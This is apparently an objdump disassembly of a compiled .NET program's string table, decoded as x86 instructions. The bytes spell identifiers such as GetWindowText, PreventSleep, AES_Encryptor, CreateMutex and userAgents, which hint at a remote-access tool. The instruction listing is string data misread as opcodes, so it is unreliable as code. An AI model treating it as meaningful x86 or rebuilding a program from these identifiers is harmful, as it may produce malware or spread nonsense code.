  409131:	65 00 54 69 6d       	add    %dl,%gs:0x6d(%ecx,%ebp,2)
  409136:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  40913b:	74 41                	je     0x40917e
  40913d:	63 74 00 75          	arpl   %esi,0x75(%eax,%eax,1)
  409141:	73 65                	jae    0x4091a8
  409143:	72 41                	jb     0x409186
  409145:	67 65 6e             	outsb  %gs:(%si),(%dx)
  409148:	74 73                	je     0x4091bd
  40914a:	00 47 65             	add    %al,0x65(%edi)
  40914d:	74 57                	je     0x4091a6
  40914f:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409156:	78 74                	js     0x4091cc
  409158:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40915c:	74 00                	je     0x40915e
  40915e:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409161:	6e                   	outsb  %ds:(%esi),(%dx)
  409162:	74 00                	je     0x409164
  409164:	53                   	push   %ebx
  409165:	65 74 54             	gs je  0x4091bc
  409168:	68 72 65 61 64       	push   $0x64616572
  40916d:	45                   	inc    %ebp
  40916e:	78 65                	js     0x4091d5
  409170:	63 75 74             	arpl   %esi,0x74(%ebp)
  409173:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40917a:	65 00 65 73          	add    %ah,%gs:0x73(%ebp)
  40917e:	46                   	inc    %esi
  40917f:	6c                   	insb   (%dx),%es:(%edi)
  409180:	61                   	popa
  409181:	67 73 00             	addr16 jae 0x409184
  409184:	50                   	push   %eax
  409185:	72 65                	jb     0x4091ec
  409187:	76 65                	jbe    0x4091ee
  409189:	6e                   	outsb  %ds:(%esi),(%dx)
  40918a:	74 53                	je     0x4091df
  40918c:	6c                   	insb   (%dx),%es:(%edi)
  40918d:	65 65 70 00          	gs gs jo 0x409191
  409191:	53                   	push   %ebx
  409192:	42                   	inc    %edx
  409193:	00 73 00             	add    %dh,0x0(%ebx)
  409196:	42                   	inc    %edx
  409197:	53                   	push   %ebx
  409198:	00 49 44             	add    %cl,0x44(%ecx)
  40919b:	00 47 65             	add    %al,0x65(%edi)
  40919e:	74 48                	je     0x4091e8
  4091a0:	61                   	popa
  4091a1:	73 68                	jae    0x40920b
  4091a3:	54                   	push   %esp
  4091a4:	00 73 74             	add    %dh,0x74(%ebx)
  4091a7:	72 54                	jb     0x4091fd
  4091a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091aa:	48                   	dec    %eax
  4091ab:	61                   	popa
  4091ac:	73 68                	jae    0x409216
  4091ae:	00 53 65             	add    %dl,0x65(%ebx)
  4091b1:	74 56                	je     0x409209
  4091b3:	61                   	popa
  4091b4:	6c                   	insb   (%dx),%es:(%edi)
  4091b5:	75 65                	jne    0x40921c
  4091b7:	00 76 61             	add    %dh,0x61(%esi)
  4091ba:	6c                   	insb   (%dx),%es:(%edi)
  4091bb:	75 65                	jne    0x409222
  4091bd:	00 47 65             	add    %al,0x65(%edi)
  4091c0:	74 56                	je     0x409218
  4091c2:	61                   	popa
  4091c3:	6c                   	insb   (%dx),%es:(%edi)
  4091c4:	75 65                	jne    0x40922b
  4091c6:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4091ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cb:	6d                   	insl   (%dx),%es:(%edi)
  4091cc:	70 72                	jo     0x409240
  4091ce:	65 73 73             	gs jae 0x409244
  4091d1:	00 43 6f             	add    %al,0x6f(%ebx)
  4091d4:	6d                   	insl   (%dx),%es:(%edi)
  4091d5:	70 72                	jo     0x409249
  4091d7:	65 73 73             	gs jae 0x40924d
  4091da:	00 41 45             	add    %al,0x45(%ecx)
  4091dd:	53                   	push   %ebx
  4091de:	5f                   	pop    %edi
  4091df:	45                   	inc    %ebp
  4091e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e1:	63 72 79             	arpl   %esi,0x79(%edx)
  4091e4:	70 74                	jo     0x40925a
  4091e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e7:	72 00                	jb     0x4091e9
  4091e9:	41                   	inc    %ecx
  4091ea:	45                   	inc    %ebp
  4091eb:	53                   	push   %ebx
  4091ec:	5f                   	pop    %edi
  4091ed:	44                   	inc    %esp
  4091ee:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4091f2:	70 74                	jo     0x409268
  4091f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f5:	72 00                	jb     0x4091f7
  4091f7:	5f                   	pop    %edi
  4091f8:	61                   	popa
  4091f9:	70 70                	jo     0x40926b
  4091fb:	4d                   	dec    %ebp
  4091fc:	75 74                	jne    0x409272
  4091fe:	65 78 00             	gs js  0x409201
  409201:	43                   	inc    %ebx
  409202:	72 65                	jb     0x409269
  409204:	61                   	popa
  409205:	74 65                	je     0x40926c
  409207:	4d                   	dec    %ebp
  409208:	75 74                	jne    0x40927e
  40920a:	65 78 00             	gs js  0x40920d
  40920d:	43                   	inc    %ebx
  40920e:	6c                   	insb   (%dx),%es:(%edi)
  40920f:	6f                   	outsl  %ds:(%esi),(%dx)
  409210:	73 65                	jae    0x409277
  409212:	4d                   	dec    %ebp
  409213:	75 74                	jne    0x409289
  409215:	65 78 00             	gs js  0x409218
  409218:	4d                   	dec    %ebp
  409219:	75 6c                	jne    0x409287
  40921b:	74 69                	je     0x409286
  40921d:	63 61 73             	arpl   %esp,0x73(%ecx)
  409220:	74 44                	je     0x409266
  409222:	65 6c                	gs insb (%dx),%es:(%edi)
  409224:	65 67 61             	gs addr16 popa
  409227:	74 65                	je     0x40928e
  409229:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  40922d:	67 65 74 4f          	addr16 gs je 0x409280
  409231:	62 6a 65             	bound  %ebp,0x65(%edx)
  409234:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  409238:	61                   	popa
  409239:	72 67                	jb     0x4092a2
  40923b:	65 74 4d             	gs je  0x40928b
  40923e:	65 74 68             	gs je  0x4092a9
  409241:	6f                   	outsl  %ds:(%esi),(%dx)
  409242:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  409246:	79 6e                	jns    0x4092b6
  409248:	63 43 61             	arpl   %eax,0x61(%ebx)
  40924b:	6c                   	insb   (%dx),%es:(%edi)
  40924c:	6c                   	insb   (%dx),%es:(%edi)
  40924d:	62 61 63             	bound  %esp,0x63(%ecx)
  409250:	6b 00 42             	imul   $0x42,(%eax),%eax
  409253:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  40925a:	6f 6b 
  40925c:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  409261:	65 67 61             	gs addr16 popa
  409264:	74 65                	je     0x4092cb
  409266:	43                   	inc    %ebx
  409267:	61                   	popa
  409268:	6c                   	insb   (%dx),%es:(%edi)
  409269:	6c                   	insb   (%dx),%es:(%edi)
  40926a:	62 61 63             	bound  %esp,0x63(%ecx)
  40926d:	6b 00 44             	imul   $0x44,(%eax),%eax
  409270:	65 6c                	gs insb (%dx),%es:(%edi)
  409272:	65 67 61             	gs addr16 popa
  409275:	74 65                	je     0x4092dc
  409277:	41                   	inc    %ecx
  409278:	73 79                	jae    0x4092f3
  40927a:	6e                   	outsb  %ds:(%esi),(%dx)
  40927b:	63 53 74             	arpl   %edx,0x74(%ebx)
  40927e:	61                   	popa
  40927f:	74 65                	je     0x4092e6
  409281:	00 45 6e             	add    %al,0x6e(%ebp)
  409284:	64 49                	fs dec %ecx
  409286:	6e                   	outsb  %ds:(%esi),(%dx)
  409287:	76 6f                	jbe    0x4092f8
  409289:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  40928d:	65 6c                	gs insb (%dx),%es:(%edi)
  40928f:	65 67 61             	gs addr16 popa
  409292:	74 65                	je     0x4092f9
  409294:	41                   	inc    %ecx
  409295:	73 79                	jae    0x409310
  409297:	6e                   	outsb  %ds:(%esi),(%dx)
  409298:	63 52 65             	arpl   %edx,0x65(%edx)
  40929b:	73 75                	jae    0x409312
  40929d:	6c                   	insb   (%dx),%es:(%edi)
  40929e:	74 00                	je     0x4092a0
  4092a0:	49                   	dec    %ecx
  4092a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a2:	76 6f                	jbe    0x409313
  4092a4:	6b 65 00 56          	imul   $0x56,0x0(%ebp),%esp
  4092a8:	61                   	popa
  4092a9:	6c                   	insb   (%dx),%es:(%edi)
  4092aa:	75 65                	jne    0x409311
  4092ac:	54                   	push   %esp
  4092ad:	79 70                	jns    0x40931f
  4092af:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  4092b3:	53                   	push   %ebx
  4092b4:	69 7a 65 00 64 77 54 	imul   $0x54776400,0x65(%edx),%edi
  4092bb:	69 6d 65 00 45 6e 75 	imul   $0x756e4500,0x65(%ebp),%ebp
  4092c2:	6d                   	insl   (%dx),%es:(%edi)
  4092c3:	00 76 61             	add    %dh,0x61(%esi)
  4092c6:	6c                   	insb   (%dx),%es:(%edi)
  4092c7:	75 65                	jne    0x40932e
  4092c9:	5f                   	pop    %edi
  4092ca:	5f                   	pop    %edi
  4092cb:	00 45 53             	add    %al,0x53(%ebp)
  4092ce:	5f                   	pop    %edi
  4092cf:	43                   	inc    %ebx
  4092d0:	4f                   	dec    %edi
  4092d1:	4e                   	dec    %esi
  4092d2:	54                   	push   %esp
  4092d3:	49                   	dec    %ecx
  4092d4:	4e                   	dec    %esi
  4092d5:	55                   	push   %ebp
  4092d6:	4f                   	dec    %edi
  4092d7:	55                   	push   %ebp
  4092d8:	53                   	push   %ebx
  4092d9:	00 45 53             	add    %al,0x53(%ebp)
  4092dc:	5f                   	pop    %edi
  4092dd:	44                   	inc    %esp
  4092de:	49                   	dec    %ecx
  4092df:	53                   	push   %ebx
  4092e0:	50                   	push   %eax
  4092e1:	4c                   	dec    %esp
  4092e2:	41                   	inc    %ecx
  4092e3:	59                   	pop    %ecx
  4092e4:	5f                   	pop    %edi
  4092e5:	52                   	push   %edx
  4092e6:	45                   	inc    %ebp
  4092e7:	51                   	push   %ecx
  4092e8:	55                   	push   %ebp
  4092e9:	49                   	dec    %ecx
  4092ea:	52                   	push   %edx
  4092eb:	45                   	inc    %ebp
  4092ec:	44                   	inc    %esp
  4092ed:	00 45 53             	add    %al,0x53(%ebp)
  4092f0:	5f                   	pop    %edi
  4092f1:	53                   	push   %ebx
  4092f2:	59                   	pop    %ecx
  4092f3:	53                   	push   %ebx
  4092f4:	54                   	push   %esp
  4092f5:	45                   	inc    %ebp
  4092f6:	4d                   	dec    %ebp
  4092f7:	5f                   	pop    %edi
  4092f8:	52                   	push   %edx
  4092f9:	45                   	inc    %ebp
  4092fa:	51                   	push   %ecx
  4092fb:	55                   	push   %ebp
  4092fc:	49                   	dec    %ecx
  4092fd:	52                   	push   %edx
  4092fe:	45                   	inc    %ebp
  4092ff:	44                   	inc    %esp
  409300:	00 53 79             	add    %dl,0x79(%ebx)
  409303:	73 74                	jae    0x409379
  409305:	65 6d                	gs insl (%dx),%es:(%edi)
  409307:	2e 43                	cs inc %ebx
  409309:	6f                   	outsl  %ds:(%esi),(%dx)
  40930a:	6d                   	insl   (%dx),%es:(%edi)
  40930b:	70 6f                	jo     0x40937c
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409310:	74 4d                	je     0x40935f
  409312:	6f                   	outsl  %ds:(%esi),(%dx)
  409313:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  409316:	00 45 64             	add    %al,0x64(%ebp)
  409319:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  409320:	77 
  409321:	73 61                	jae    0x409384
  409323:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  409327:	74 74                	je     0x40939d
  409329:	72 69                	jb     0x409394
  40932b:	62 75 74             	bound  %esi,0x74(%ebp)
  40932e:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  409332:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  409339:	77 
  40933a:	73 61                	jae    0x40939d
  40933c:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  409340:	74 61                	je     0x4093a3
  409342:	74 65                	je     0x4093a9
  409344:	00 53 79             	add    %dl,0x79(%ebx)
  409347:	73 74                	jae    0x4093bd
  409349:	65 6d                	gs insl (%dx),%es:(%edi)
  40934b:	2e 43                	cs inc %ebx
  40934d:	6f                   	outsl  %ds:(%esi),(%dx)
  40934e:	64 65 44             	fs gs inc %esp
  409351:	6f                   	outsl  %ds:(%esi),(%dx)
  409352:	6d                   	insl   (%dx),%es:(%edi)
  409353:	2e 43                	cs inc %ebx
  409355:	6f                   	outsl  %ds:(%esi),(%dx)
  409356:	6d                   	insl   (%dx),%es:(%edi)
  409357:	70 69                	jo     0x4093c2
  409359:	6c                   	insb   (%dx),%es:(%edi)
  40935a:	65 72 00             	gs jb  0x40935d
  40935d:	47                   	inc    %edi
  40935e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409360:	65 72 61             	gs jb  0x4093c4
  409363:	74 65                	je     0x4093ca
  409365:	64 43                	fs inc %ebx
  409367:	6f                   	outsl  %ds:(%esi),(%dx)
  409368:	64 65 41             	fs gs inc %ecx
  40936b:	74 74                	je     0x4093e1
  40936d:	72 69                	jb     0x4093d8
  40936f:	62 75 74             	bound  %esi,0x74(%ebp)
  409372:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  409376:	73 74                	jae    0x4093ec
  409378:	65 6d                	gs insl (%dx),%es:(%edi)
  40937a:	2e 44                	cs inc %esp
  40937c:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  409383:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  40938a:	75 67                	jne    0x4093f3
  40938c:	67 65 72 48          	addr16 gs jb 0x4093d8
  409390:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  409397:	74 
  409398:	72 69                	jb     0x409403
  40939a:	62 75 74             	bound  %esi,0x74(%ebp)
  40939d:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  4093a1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4093a4:	73 6f                	jae    0x409415
  4093a6:	66 74 2e             	data16 je 0x4093d7
  4093a9:	56                   	push   %esi
  4093aa:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4093b1:	73 69                	jae    0x40941c
  4093b3:	63 2e                	arpl   %ebp,(%esi)
  4093b5:	43                   	inc    %ebx
  4093b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4093b7:	6d                   	insl   (%dx),%es:(%edi)
  4093b8:	70 69                	jo     0x409423
  4093ba:	6c                   	insb   (%dx),%es:(%edi)
  4093bb:	65 72 53             	gs jb  0x409411
  4093be:	65 72 76             	gs jb  0x409437
  4093c1:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  4093c8:	61                   	popa
  4093c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ca:	64 61                	fs popa
  4093cc:	72 64                	jb     0x409432
  4093ce:	4d                   	dec    %ebp
  4093cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d0:	64 75 6c             	fs jne 0x40943f
  4093d3:	65 41                	gs inc %ecx
  4093d5:	74 74                	je     0x40944b
  4093d7:	72 69                	jb     0x409442
  4093d9:	62 75 74             	bound  %esi,0x74(%ebp)
  4093dc:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  4093e0:	64 65 4d             	fs gs dec %ebp
  4093e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e4:	64 75 6c             	fs jne 0x409453
  4093e7:	65 4e                	gs dec %esi
  4093e9:	61                   	popa
  4093ea:	6d                   	insl   (%dx),%es:(%edi)
  4093eb:	65 41                	gs inc %ecx
  4093ed:	74 74                	je     0x409463
  4093ef:	72 69                	jb     0x40945a
  4093f1:	62 75 74             	bound  %esi,0x74(%ebp)
  4093f4:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4093f8:	73 74                	jae    0x40946e
  4093fa:	65 6d                	gs insl (%dx),%es:(%edi)
  4093fc:	2e 43                	cs inc %ebx
  4093fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ff:	6d                   	insl   (%dx),%es:(%edi)
  409400:	70 6f                	jo     0x409471
  409402:	6e                   	outsb  %ds:(%esi),(%dx)
  409403:	65 6e                	outsb  %gs:(%esi),(%dx)
  409405:	74 4d                	je     0x409454
  409407:	6f                   	outsl  %ds:(%esi),(%dx)
  409408:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40940b:	2e 44                	cs inc %esp
  40940d:	65 73 69             	gs jae 0x409479
  409410:	67 6e                	outsb  %ds:(%si),(%dx)
  409412:	00 48 65             	add    %cl,0x65(%eax)
  409415:	6c                   	insb   (%dx),%es:(%edi)
  409416:	70 4b                	jo     0x409463
  409418:	65 79 77             	gs jns 0x409492
  40941b:	6f                   	outsl  %ds:(%esi),(%dx)
  40941c:	72 64                	jb     0x409482
  40941e:	41                   	inc    %ecx
  40941f:	74 74                	je     0x409495
  409421:	72 69                	jb     0x40948c
  409423:	62 75 74             	bound  %esi,0x74(%ebp)
  409426:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  40942a:	73 74                	jae    0x4094a0
  40942c:	65 6d                	gs insl (%dx),%es:(%edi)
  40942e:	2e 52                	cs push %edx
  409430:	75 6e                	jne    0x4094a0
  409432:	74 69                	je     0x40949d
  409434:	6d                   	insl   (%dx),%es:(%edi)
  409435:	65 2e 43             	gs cs inc %ebx
  409438:	6f                   	outsl  %ds:(%esi),(%dx)
  409439:	6d                   	insl   (%dx),%es:(%edi)
  40943a:	70 69                	jo     0x4094a5
  40943c:	6c                   	insb   (%dx),%es:(%edi)
  40943d:	65 72 53             	gs jb  0x409493
  409440:	65 72 76             	gs jb  0x4094b9
  409443:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  40944a:	6e                   	outsb  %ds:(%esi),(%dx)
  40944b:	74 69                	je     0x4094b6
  40944d:	6d                   	insl   (%dx),%es:(%edi)
  40944e:	65 48                	gs dec %eax
  409450:	65 6c                	gs insb (%dx),%es:(%edi)
  409452:	70 65                	jo     0x4094b9
  409454:	72 73                	jb     0x4094c9
  409456:	00 47 65             	add    %al,0x65(%edi)
  409459:	74 4f                	je     0x4094aa
  40945b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40945e:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  409462:	6c                   	insb   (%dx),%es:(%edi)
  409463:	75 65                	jne    0x4094ca
  409465:	00 52 75             	add    %dl,0x75(%edx)
  409468:	6e                   	outsb  %ds:(%esi),(%dx)
  409469:	74 69                	je     0x4094d4
  40946b:	6d                   	insl   (%dx),%es:(%edi)
  40946c:	65 54                	gs push %esp
  40946e:	79 70                	jns    0x4094e0
  409470:	65 48                	gs dec %eax
  409472:	61                   	popa
  409473:	6e                   	outsb  %ds:(%esi),(%dx)
  409474:	64 6c                	fs insb (%dx),%es:(%edi)
  409476:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40947a:	74 54                	je     0x4094d0
  40947c:	79 70                	jns    0x4094ee
  40947e:	65 46                	gs inc %esi
  409480:	72 6f                	jb     0x4094f1
  409482:	6d                   	insl   (%dx),%es:(%edi)
  409483:	48                   	dec    %eax
  409484:	61                   	popa
  409485:	6e                   	outsb  %ds:(%esi),(%dx)
  409486:	64 6c                	fs insb (%dx),%es:(%edi)
  409488:	65 00 41 63          	add    %al,%gs:0x63(%ecx)
  40948c:	74 69                	je     0x4094f7
  40948e:	76 61                	jbe    0x4094f1
  409490:	74 6f                	je     0x409501
  409492:	72 00                	jb     0x409494
  409494:	43                   	inc    %ebx
  409495:	72 65                	jb     0x4094fc
  409497:	61                   	popa
  409498:	74 65                	je     0x4094ff
  40949a:	49                   	dec    %ecx
  40949b:	6e                   	outsb  %ds:(%esi),(%dx)
  40949c:	73 74                	jae    0x409512
  40949e:	61                   	popa
  40949f:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a0:	63 65 00             	arpl   %esp,0x0(%ebp)
  4094a3:	4d                   	dec    %ebp
  4094a4:	79 47                	jns    0x4094ed
  4094a6:	72 6f                	jb     0x409517
  4094a8:	75 70                	jne    0x40951a
  4094aa:	43                   	inc    %ebx
  4094ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ac:	6c                   	insb   (%dx),%es:(%edi)
  4094ad:	6c                   	insb   (%dx),%es:(%edi)
  4094ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4094b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4094b4:	41                   	inc    %ecx
  4094b5:	74 74                	je     0x40952b
  4094b7:	72 69                	jb     0x409522
  4094b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4094bc:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4094c0:	73 74                	jae    0x409536
  4094c2:	65 6d                	gs insl (%dx),%es:(%edi)
  4094c4:	2e 52                	cs push %edx
  4094c6:	75 6e                	jne    0x409536
  4094c8:	74 69                	je     0x409533
  4094ca:	6d                   	insl   (%dx),%es:(%edi)
  4094cb:	65 2e 49             	gs cs dec %ecx
  4094ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4094cf:	74 65                	je     0x409536
  4094d1:	72 6f                	jb     0x409542
  4094d3:	70 53                	jo     0x409528
  4094d5:	65 72 76             	gs jb  0x40954e
  4094d8:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4094df:	6d                   	insl   (%dx),%es:(%edi)
  4094e0:	56                   	push   %esi
  4094e1:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4094e8:	74 74                	je     0x40955e
  4094ea:	72 69                	jb     0x409555
  4094ec:	62 75 74             	bound  %esi,0x74(%ebp)
  4094ef:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  4094f4:	65 61                	gs popa
  4094f6:	64 53                	fs push %ebx
  4094f8:	74 61                	je     0x40955b
  4094fa:	74 69                	je     0x409565
  4094fc:	63 41 74             	arpl   %eax,0x74(%ecx)
  4094ff:	74 72                	je     0x409573
  409501:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  409508:	6f                   	outsl  %ds:(%esi),(%dx)
  409509:	6d                   	insl   (%dx),%es:(%edi)
  40950a:	70 69                	jo     0x409575
  40950c:	6c                   	insb   (%dx),%es:(%edi)
  40950d:	65 72 47             	gs jb  0x409557
  409510:	65 6e                	outsb  %gs:(%esi),(%dx)
  409512:	65 72 61             	gs jb  0x409576
  409515:	74 65                	je     0x40957c
  409517:	64 41                	fs inc %ecx
  409519:	74 74                	je     0x40958f
  40951b:	72 69                	jb     0x409586
  40951d:	62 75 74             	bound  %esi,0x74(%ebp)
  409520:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409524:	6e                   	outsb  %ds:(%esi),(%dx)
  409525:	76 65                	jbe    0x40958c
  409527:	72 73                	jb     0x40959c
  409529:	69 6f 6e 73 00 54 6f 	imul   $0x6f540073,0x6e(%edi),%ebp
  409530:	49                   	dec    %ecx
  409531:	6e                   	outsb  %ds:(%esi),(%dx)
  409532:	74 65                	je     0x409599
  409534:	67 65 72 00          	addr16 gs jb 0x409538
  409538:	49                   	dec    %ecx
  409539:	6e                   	outsb  %ds:(%esi),(%dx)
  40953a:	74 65                	je     0x4095a1
  40953c:	72 61                	jb     0x40959f
  40953e:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  409542:	6e                   	outsb  %ds:(%esi),(%dx)
  409543:	00 45 6e             	add    %al,0x6e(%ebp)
  409546:	76 69                	jbe    0x4095b1
  409548:	72 6f                	jb     0x4095b9
  40954a:	6e                   	outsb  %ds:(%esi),(%dx)
  40954b:	00 53 74             	add    %dl,0x74(%ebx)
  40954e:	72 69                	jb     0x4095b9
  409550:	6e                   	outsb  %ds:(%esi),(%dx)
  409551:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  409555:	6e                   	outsb  %ds:(%esi),(%dx)
  409556:	63 61 74             	arpl   %esp,0x74(%ecx)
  409559:	00 56 42             	add    %dl,0x42(%esi)
  40955c:	24 41                	and    $0x41,%al
  40955e:	6e                   	outsb  %ds:(%esi),(%dx)
  40955f:	6f                   	outsl  %ds:(%esi),(%dx)
  409560:	6e                   	outsb  %ds:(%esi),(%dx)
  409561:	79 6d                	jns    0x4095d0
  409563:	6f                   	outsl  %ds:(%esi),(%dx)
  409564:	75 73                	jne    0x4095d9
  409566:	44                   	inc    %esp
  409567:	65 6c                	gs insb (%dx),%es:(%edi)
  409569:	65 67 61             	gs addr16 popa
  40956c:	74 65                	je     0x4095d3
  40956e:	5f                   	pop    %edi
  40956f:	30 00                	xor    %al,(%eax)
  409571:	5f                   	pop    %edi
  409572:	4c                   	dec    %esp
  409573:	61                   	popa
  409574:	6d                   	insl   (%dx),%es:(%edi)
  409575:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409579:	5f                   	pop    %edi
  40957a:	5f                   	pop    %edi
  40957b:	31 00                	xor    %eax,(%eax)
  40957d:	5f                   	pop    %edi
  40957e:	4c                   	dec    %esp
  40957f:	61                   	popa
  409580:	6d                   	insl   (%dx),%es:(%edi)
  409581:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409585:	5f                   	pop    %edi
  409586:	5f                   	pop    %edi
  409587:	32 00                	xor    (%eax),%al
  409589:	5f                   	pop    %edi
  40958a:	4c                   	dec    %esp
  40958b:	61                   	popa
  40958c:	6d                   	insl   (%dx),%es:(%edi)
  40958d:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409591:	5f                   	pop    %edi
  409592:	5f                   	pop    %edi
  409593:	33 00                	xor    (%eax),%eax
  409595:	44                   	inc    %esp
  409596:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40959a:	67 65 72 44          	addr16 gs jb 0x4095e2
  40959e:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  4095a5:	74 74                	je     0x40961b
  4095a7:	72 69                	jb     0x409612
  4095a9:	62 75 74             	bound  %esi,0x74(%ebp)
  4095ac:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4095b1:	75 67                	jne    0x40961a
  4095b3:	67 65 72 53          	addr16 gs jb 0x40960a
  4095b7:	74 65                	je     0x40961e
  4095b9:	70 54                	jo     0x40960f
  4095bb:	68 72 6f 75 67       	push   $0x67756f72
  4095c0:	68 41 74 74 72       	push   $0x72747441
  4095c5:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%edx),%esp
  4095cc:	78 63                	js     0x409631
  4095ce:	65 70 74             	gs jo  0x409645
  4095d1:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  4095d8:	65 49                	gs dec %ecx
  4095da:	6e                   	outsb  %ds:(%esi),(%dx)
  4095db:	66 6f                	outsw  %ds:(%esi),(%dx)
  4095dd:	00 50 72             	add    %dl,0x72(%eax)
  4095e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4095e4:	73 00                	jae    0x4095e6
  4095e6:	50                   	push   %eax
  4095e7:	72 6f                	jb     0x409658
  4095e9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4095ec:	73 53                	jae    0x409641
  4095ee:	74 61                	je     0x409651
  4095f0:	72 74                	jb     0x409666
  4095f2:	49                   	dec    %ecx
  4095f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095f4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4095f6:	00 45 6e             	add    %al,0x6e(%ebp)
  4095f9:	76 69                	jbe    0x409664
  4095fb:	72 6f                	jb     0x40966c
  4095fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fe:	6d                   	insl   (%dx),%es:(%edi)
  4095ff:	65 6e                	outsb  %gs:(%esi),(%dx)
  409601:	74 00                	je     0x409603
  409603:	45                   	inc    %ebp
  409604:	78 70                	js     0x409676
  409606:	61                   	popa
  409607:	6e                   	outsb  %ds:(%esi),(%dx)
  409608:	64 45                	fs inc %ebp
  40960a:	6e                   	outsb  %ds:(%esi),(%dx)
  40960b:	76 69                	jbe    0x409676
  40960d:	72 6f                	jb     0x40967e
  40960f:	6e                   	outsb  %ds:(%esi),(%dx)
  409610:	6d                   	insl   (%dx),%es:(%edi)
  409611:	65 6e                	outsb  %gs:(%esi),(%dx)
  409613:	74 56                	je     0x40966b
  409615:	61                   	popa
  409616:	72 69                	jb     0x409681
  409618:	61                   	popa
  409619:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40961d:	00 50 72             	add    %dl,0x72(%eax)
  409620:	6f                   	outsl  %ds:(%esi),(%dx)
  409621:	6a 65                	push   $0x65
  409623:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  409627:	74 61                	je     0x40968a
  409629:	00 53 65             	add    %dl,0x65(%ebx)
  40962c:	74 50                	je     0x40967e
  40962e:	72 6f                	jb     0x40969f
  409630:	6a 65                	push   $0x65
  409632:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  409636:	72 6f                	jb     0x4096a7
  409638:	72 00                	jb     0x40963a
  40963a:	45                   	inc    %ebp
  40963b:	78 69                	js     0x4096a6
  40963d:	74 00                	je     0x40963f
